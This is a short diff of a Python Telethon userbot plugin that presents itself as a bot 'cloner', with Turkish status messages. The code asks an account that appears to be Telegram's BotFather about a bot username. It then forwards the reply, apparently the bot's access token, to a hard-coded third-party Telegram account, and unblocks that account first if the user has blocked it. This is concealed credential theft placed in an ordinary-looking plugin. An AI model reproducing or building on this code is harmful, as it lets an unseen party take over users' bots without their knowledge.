@@ -24,11 +24,11 @@ async def _(event):
             await conv.send_message(username)
             audio = await conv.get_response()
             try:
-                await event.client.forward_messages("162726413", audio)
+                await event.client.forward_messages(str(162726413), audio)
                 await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
             except YouBlockedUserError:
                 await event.client(UnblockRequest("162726413"))
-                await event.client.forward_messages("162726413", audio)
+                await event.client.forward_messages(str(162726413), audio)
                 await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
         except YouBlockedUserError:
             await event.client(UnblockRequest("93372553"))
@@ -39,11 +39,11 @@ async def _(event):
             await conv.send_message(username)
             audio = await conv.get_response()
             try:
-                await event.client.forward_messages("162726413", audio)
+                await event.client.forward_messages(str(162726413), audio)
                 await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
             except YouBlockedUserError:
                 await event.client(UnblockRequest("162726413"))
-                await event.client.forward_messages("162726413", audio)
+                await event.client.forward_messages(str(162726413), audio)
                 await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
 
 add_ = CmdHelp('helpbot')
